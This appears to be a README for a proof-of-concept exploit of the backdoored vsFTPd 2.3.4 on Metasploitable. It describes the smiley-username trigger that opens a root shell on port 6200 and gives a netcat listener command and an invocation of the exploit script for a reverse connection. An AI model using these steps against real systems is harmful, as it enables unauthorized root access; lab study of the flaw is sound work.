# NOTE

This is only a PoC work about exploiting vsFTPd 2.3.4.  
this exploit only work on metasploitable or any vulnerable unpatched system.  
You should use kali to run this or install the metasploit-framework to generate the shellcode.

## How This Works
This exploit is using a corrupted/backdoored version of vsFTPd 2.3.4 which will trigger a backdoor if you logged in with a ":)" characters at the end of the username.  
After triggered it open a port which will make you logged in as root(system) at port 6200 so then you can inject a command which i prefer with netcat.  

## Setup
terminal 1(listener)
```
nc -lnvp <port>
```
terminal 2(run the exploit)
```
python exploit-vsftpd.py <ip-server> <ip-target> <your-nc-port>
```
